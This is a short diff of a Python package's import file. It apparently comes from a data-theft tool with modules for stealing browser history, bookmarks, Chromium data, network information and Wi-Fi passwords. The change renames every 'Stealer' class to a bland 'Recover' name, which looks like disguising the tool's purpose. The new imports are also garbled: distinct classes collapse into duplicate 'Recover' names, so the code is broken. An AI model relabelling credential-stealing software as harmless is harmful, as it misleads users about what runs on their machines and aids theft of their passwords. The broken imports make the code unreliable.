@@ -1,3 +1,3 @@
-from .browsers import WebBookmarksStealer, WebHistoryStealer, ChromiumStealer
-from .network import NetworkInfoStealer, WifiPasswordStealer
-from .systeminfo import SystemInfoStealer
+from .browsers import Recover, Recover, ChromiumRecover
+from .network import Recover, Recover
+from .systeminfo import Recover
